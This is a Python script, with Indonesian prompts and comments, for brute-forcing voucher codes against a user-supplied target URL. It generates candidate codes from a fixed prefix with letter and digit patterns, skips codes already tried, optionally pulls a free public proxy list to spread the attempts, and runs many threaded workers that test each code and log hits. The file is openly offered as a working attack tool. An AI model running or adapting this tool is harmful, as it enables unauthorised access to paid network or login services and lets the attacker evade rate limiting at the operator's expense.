import requests
import string
import threading
import sys
import os
import itertools
from concurrent.futures import ThreadPoolExecutor

from banner import print_banner
from target import get_target_url, safe_input 
from worker_mirror import worker_mirror
import config
import time

def get_proxies():
    print("[~] Mengambil proxy ...")
    url = "https://www.proxy-list.download/api/v1/get?type=http"
    response = requests.get(url)
    proxies = []
    if response.status_code == 200:
        proxy_list = response.text.strip().split("\r\n")
        for proxy in proxy_list:
            proxies.append({
                "http": f"http://{proxy}",
                "https": f"http://{proxy}",
            })
    else:
        print("Gagal ambil proxy.")
    return proxies


def generate_voucher_mirror(prefix, letters_len=2, digits_len=2):
    letters = string.ascii_lowercase
    for letter_pair in itertools.product(letters, repeat=letters_len):
        letter_str = ''.join(letter_pair)
        reverse_str = letter_str[::-1]

        pairs = [letter_str]
        if reverse_str != letter_str:
            pairs.append(reverse_str)

        for pair in pairs:
            for num in range(1, 100):
                num_str = str(num).zfill(digits_len)
                yield f"{prefix}{pair}{num_str}"


def generate_voucher_custom(prefix="7"):
    letters = string.ascii_lowercase
    digits = "01"  # cuma 0 atau 1
    for l1 in letters:
        for l2 in letters:
            for l3 in letters:
                for d1 in digits:
                    for d2 in digits:
                        yield f"{prefix}{l1}{l2}{l3}{d1}{d2}"


def clear_logs(prefix):
    for fname in [f"success_{prefix}.log", f"failed_{prefix}.log",
                  f"success_multi_{prefix}.log", f"failed_multi_{prefix}.log"]:
        if os.path.exists(fname):
            os.remove(fname)
    config.tried_vouchers[prefix] = set()
    print(f"[~] Semua log untuk prefix {prefix} dibersihkan.")


def load_tried_vouchers(prefix):
    tried = set()
    for fname in [f"success_{prefix}.log", f"failed_{prefix}.log",
                  f"success_multi_{prefix}.log", f"failed_multi_{prefix}.log"]:
        if os.path.exists(fname):
            with open(fname, "r") as f:
                for line in f:
                    tried.add(line.strip())
    config.tried_vouchers[prefix] = tried
    print(f"[~] Total voucher yang sudah pernah dicoba untuk prefix {prefix}: {len(tried)}")

def load_custom(prefix="7"):
    print(f"[~] Generating kombinasi khusus untuk prefix {prefix} ...")
    count = 0
    tried = config.tried_vouchers.get(prefix, set())
    for v in generate_voucher_custom(prefix):
        if config.stop_event.is_set():
            break
        if v not in tried:
            config.voucher_queue.put(v)
            count += 1

    if count == 0:
        print(f"[✓] Semua voucher prefix {prefix} sudah pernah dicoba.")
        choice = safe_input("Mau reset log dan mulai fresh lagi? (y/n): ").strip().lower()
        if choice == "y":
            clear_logs()
            print("[~] Silakan jalankan ulang script untuk mulai fresh.")
            config.stop_event.set()
    else:
        print(f"[~] Total voucher kombinasi baru: {count}")
        print("[!] Semua voucher selesai digenerate.")


def load_mirror(prefix, letters_len=2, digits_len=2):
    print(f"[~] Generating kombinasi mirror untuk prefix {prefix} ...")
    all_vouchers = list(generate_voucher_mirror(prefix, letters_len, digits_len))
    total = len(all_vouchers)

    tried = config.tried_vouchers.get(prefix, set())
    new_vouchers = [v for v in all_vouchers if v not in tried]

    if not new_vouchers:
        choice = input(f"[!] Semua voucher prefix {prefix} sudah dicoba. Reset log dan mulai ulang? (y/n): ")
        if choice.lower() == "y":
            for fname in [f"success_{prefix}.log", f"failed_{prefix}.log",
                          f"success_multi_{prefix}.log", f"failed_multi_{prefix}.log"]:
                if os.path.exists(fname):
                    os.remove(fname)
            config.tried_vouchers[prefix] = set()
            new_vouchers = all_vouchers  # ulangi dari awal
        else:
            print("[~] Tidak ada voucher baru, keluar.")
            return

    for v in new_vouchers:
        if config.stop_event.is_set():
            break
        config.voucher_queue.put(v)

    print(f"[~] Total kemungkinan voucher prefix {prefix}: {total}")
    print(f"[~] Voucher baru yang akan diuji: {len(new_vouchers)}")
    print("[!] Semua voucher selesai digenerate.")


def main():
    print_banner()
    config.TARGET_URL = get_target_url()

    print("=== Voucher Brute Force Mirror + Multi-Login Test ===")
    prefix = safe_input("Prefix fix (contoh 12 atau 7): ").strip()

    use_proxy = safe_input("Gunakan proxy? (y/n): ").strip().lower() == "y"

    load_tried_vouchers(prefix)

    if use_proxy:
        config.working_proxies = get_proxies()
        if not config.working_proxies:
            print("Tidak ada proxy aktif.")
            sys.exit(1)
    else:
        config.working_proxies = []

    # pilih generator sesuai prefix
    if prefix.startswith("7"):
        generator_func = load_custom
        generator_args = (prefix,)
    else:
        generator_func = load_mirror
        generator_args = (prefix, 2, 2)

    print(f"[~] Mulai brute prefix {prefix} ... Tekan Ctrl+C untuk berhenti.\n")

    generator_thread = threading.Thread(
        target=generator_func,
        args=generator_args,
        daemon=True  # biar otomatis mati kalau main thread mati
    )
    generator_thread.start()

      # 🕐 delay sebelum mulai worker
    generator_thread.join()  # tunggu voucher selesai digenerate
    print("\n[~] Voucher selesai digenerate. Mulai testing dalam 3 detik...\n")
    time.sleep(3)

    try:
        with ThreadPoolExecutor(max_workers=config.MAX_THREADS) as executor:
            futures = []
            for i in range(config.MAX_THREADS):
                proxy = config.working_proxies[i % len(config.working_proxies)] if use_proxy else None
                futures.append(executor.submit(worker_mirror, use_proxy, proxy, prefix))

            while generator_thread.is_alive() or not config.voucher_queue.empty():
                generator_thread.join(timeout=1)  # cek tiap detik
                if config.stop_event.is_set():
                    break

    except KeyboardInterrupt:
        print("\n[!] Dihentikan manual oleh user (CTRL+C).")
        config.stop_event.set()
        # kirim sentinel untuk semua worker biar langsung keluar
        for _ in range(config.MAX_THREADS):
            config.voucher_queue.put(None)

    finally:
        generator_thread.join(timeout=1)
        # pastikan worker selesai
        for _ in range(config.MAX_THREADS):
            config.voucher_queue.put(None)


if __name__ == "__main__":
    main()
